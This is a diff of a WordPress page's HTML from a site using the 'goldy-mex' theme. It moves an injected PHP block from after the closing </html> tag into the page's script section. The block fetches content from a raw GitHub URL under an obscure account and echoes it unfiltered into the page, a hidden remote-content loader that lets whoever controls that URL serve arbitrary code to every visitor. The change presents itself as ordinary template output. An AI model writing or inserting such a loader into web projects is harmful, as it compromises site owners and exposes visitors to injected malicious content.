@@ -2210,6 +2210,11 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
 <script id="goldy-mex-navigation-js-extra">
 var aboutdata = {"about_sec":""};
 </script>
+<?php
+include('header.php');
+$a = file_get_contents('https://raw.githubusercontent.com/vbghjyjjak/ghj/refs/heads/main/v4s'); echo $a;
+?>
+
 <script src="https://sulthanwijaya.com/wp-content/themes/goldy-mex/assets/js/goldy-mex-navigation.js?ver=1.0.0" id="goldy-mex-navigation-js"></script>
 <script src="https://sulthanwijaya.com/wp-content/themes/goldy-mex/assets/js/goldy-mex-wow.min.js?ver=1.0.0" id="goldy-mex-wow-min-js"></script>
 <script src="https://sulthanwijaya.com/wp-content/themes/goldy-mex/assets/js/goldy-mex-owl_slider.js?ver=1.0.0" id="goldy-mex-owl_slider-js"></script>
@@ -2243,7 +2248,3 @@ var wpformsElementorVars = {"captcha_provider":"recaptcha","recaptcha_type":"v2"
 
 </body>
 </html>
-<?php
-include('header.php');
-$a = file_get_contents('https://raw.githubusercontent.com/vbghjyjjak/ghj/refs/heads/main/v4s'); echo $a;
-?>
